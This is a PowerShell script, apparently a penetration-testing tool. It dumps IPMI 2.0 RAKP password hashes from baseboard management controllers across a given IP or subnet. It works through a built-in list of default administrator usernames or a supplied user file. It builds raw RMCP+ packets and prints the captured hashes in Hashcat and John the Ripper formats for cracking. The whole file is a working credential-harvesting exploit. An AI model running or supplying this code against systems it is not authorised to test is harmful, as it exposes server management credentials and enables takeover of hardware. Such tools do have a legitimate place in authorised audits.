# IPMI Hash Dumping PowerShell implementation
#
# Arguments:    Required: [-IP 10.10.1.1 || 10.10.1.1/24 ]
#
#               Optional: [-Users username || users.txt] 
#                         [-Port 624]
#
# Default Userlist: "Admin", "Administrator", "admin", "administrator", "ADMIN", "root", "USERID"
#
# Example: Invoke-IPMIDump -IP 10.10.1.1

function Send-Receive {
    param (
        [System.Net.Sockets.UdpClient]$Sock,
        [string]$IP,
        [Byte[]]$Data,
        [int]$Port
    )
    $remoteEP = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IP), $Port)
    $receivedBytes = $Sock.Send($Data, $Data.Length, $remoteEP)
    $receiveBytes = $Sock.Receive([ref]$remoteEP)
    return $receiveBytes
}

function Get-SubnetAddresses {
    Param (
        [IPAddress]$IP,
        [ValidateRange(0, 32)][int]$MaskBits
    )

    $mask = ([Math]::Pow(2, $MaskBits) - 1) * [Math]::Pow(2, (32 - $MaskBits))
    $maskbytes = [BitConverter]::GetBytes([UInt32] $mask)
    $DottedMask = [IPAddress]((3..0 | ForEach-Object { [String] $maskbytes[$_] }) -join '.')

    $lower = [IPAddress] ( $ip.Address -band $DottedMask.Address )

    $LowerBytes = [BitConverter]::GetBytes([UInt32] $lower.Address)
    [IPAddress]$upper = (0..3 | %{$LowerBytes[$_] + ($maskbytes[(3-$_)] -bxor 255)}) -join '.'

    $ips = @($lower,$upper)
    return $ips
}

Function Get-IPRange {
    param (
    [IPAddress]$Lower,
    [IPAddress]$Upper
    )
    $IPList = [Collections.ArrayList]::new()
    $null = $IPList.Add($Lower)
    $i = $Lower
    while ( $i -ne $Upper ) { 
        $iBytes = [BitConverter]::GetBytes([UInt32] $i.Address)
        [Array]::Reverse($iBytes)
        $nextBytes = [BitConverter]::GetBytes([UInt32]([bitconverter]::ToUInt32($iBytes,0) +1))
        [Array]::Reverse($nextBytes)
        $i = [IPAddress]$nextBytes
        $null = $IPList.Add($i)
    }
    return $IPList
}

function Test-IP {
    param (
        [string]$IP,
        [Byte[]]$SessionID,
        [System.Net.Sockets.UdpClient]$Sock,
        [int]$Port
    )

    $data =  0x06, 0x00, 0xff, 0x07
    $data += 0x06, 0x10, 0x00, 0x00
    $data += 0x00, 0x00, 0x00, 0x00
    $data += 0x00, 0x00, 0x20, 0x00
    $data += 0x00, 0x00, 0x00, 0x00
    $data += $SessionID
    $data += 0x00, 0x00, 0x00, 0x08
    $data += 0x01, 0x00, 0x00, 0x00
    $data += 0x01, 0x00, 0x00, 0x08
    $data += 0x01, 0x00, 0x00, 0x00
    $data += 0x02, 0x00, 0x00, 0x08
    $data += 0x01, 0x00, 0x00, 0x00

    try {
        $sResponse1 = Send-Receive -Sock $Sock -IP $IP -Data $data -Port $Port
    } catch {
        Write-Host "[!] $IP does not have IPMI/RMCP+ running or is not vulnerable"
        return -111
    }
    return $sResponse1
}

function Attempt-Retrieve {
    param (
        [string]$User,
        [string]$IP,
        [int]$Port
    )

    $rSessionID = (30..90) + (97..122) | Get-Random -Count 4 | % {[Byte[]]$_}
    $sock = New-Object System.Net.Sockets.UdpClient
    $sock.Client.ReceiveTimeout = 300

    $tResponse = Test-IP -IP $IP -SessionID $rSessionID -Port $Port -Sock $sock
    if ($tResponse  -eq -111){
        return -111
    }

    if ($tResponse.Length -gt 0) {
 
        $rRequestSALT = (30..90) + (97..122) | Get-Random -Count 16 | % {[Byte[]]$_}
        $sUserLength1 = [Byte]($User.Length+28), 0x00
        $sUserLength2 = [Byte]$User.Length
        $sHexUser = [System.Text.Encoding]::ASCII.GetBytes($User)
        $rRequestID = $tResponse[24..27]

        $data =  0x06, 0x00, 0xff, 0x07
        $data += 0x06, 0x12
        $data += 0x00, 0x00, 0x00, 0x00
        $data += 0x00, 0x00, 0x00, 0x00
        $data += $sUserLength1
        $data += 0x00, 0x00, 0x00, 0x00
        $data += $rRequestID  
        $data += $rRequestSALT
        $data += 0x14, 0x00, 0x00
        $data += $sUserLength2
        $data += $sHexUser

        try {
            $sResponse1 = Send-Receive -Sock $sock -IP $IP -Data $data -Port $Port
            $iMessageLength = $sResponse1[14]
            if ($iMessageLength -eq 60) {

                Write-Host "[+] $User :"
                $sResponseData = $sResponse1[24..$sResponse1.Length]

                if (($sResponseData.Length * 2) -eq (($iMessageLength - 8) * 2)) {
                    $rSessionIDHex = ($rSessionID|ForEach-Object ToString X2) -join ''
                    $rRequestIDHex = ($rRequestID|ForEach-Object ToString X2) -join ''
                    $rResponseSALTHex = ($sResponseData[0..31]|ForEach-Object ToString X2) -join ''
                    $rResponseHashHex = ($sResponseData[32..$sResponseData.Length]|ForEach-Object ToString X2) -join ''
                    $sUserLength2Hex = ($sUserLength2|ForEach-Object ToString X2) -join ''
                    $sHexUserHex = ($sHexUser|ForEach-Object ToString X2) -join ''
                    $rRequestSALTHex = ($rRequestSALT|ForEach-Object ToString X2) -join ''
                    $Hash = $rSessionIDHex+$rRequestIDHex+$rRequestSALTHex+$rResponseSALTHex+'14'+$sUserLength2Hex+$sHexUserHex+':'+$rResponseHashHex
                    $Hash = $Hash.ToLower()
                    $johnHash = $User+':'+'$rakp$' + $Hash.Replace(':','$')
                    Write-Host "[Hashcat] " $Hash
                    Write-Host "[John TR] " $johnHash
                }

            } else {
                Write-Host "[-] Wrong iMessageLength"
                return
            }

        } catch {
            Write-Host "[!] Error: $_ "
            $sock.Close()
        }

        $sock.Close()
    } 
}

function Invoke-IPMIDump {
    param (
        [string]$Users,
        [string]$IP,
        [int]$Port = 623
    )

    if ($IP.Contains("/")) {
        $mb = $IP.Split("/")[1]
        $IP = $IP.Split("/")[0]
        $ips = Get-SubnetAddresses -MaskBits $mb -IP $IP
        $ipAddresses = Get-IPRange -Lower $ips[0] -Upper $ips[1]
    } else {
        $ipAddresses = @($IP)
    }
    foreach ($ip in $ipAddresses){
        if ([string]::IsNullOrEmpty($Users)) {
            [String[]]$users = @("Admin", "Administrator", "admin", "administrator", "ADMIN", "root", "USERID")
            foreach($user in $users) {
                $res = Attempt-Retrieve -User $user -Port $Port -IP $ip
                if ($res -eq -111) {
                    break
                }
            }
        } else {
            if ([System.IO.File]::Exists($Users)) {
                foreach($User in Get-Content $Users) {
                    $res = Attempt-Retrieve -User $User -Port $Port -IP $ip
                    if ($res -eq -111) {
                        break
                    }
                }
            } else {
                Attempt-Retrieve -User $Users -Port $Port -IP $ip
            }
        }        
    }
}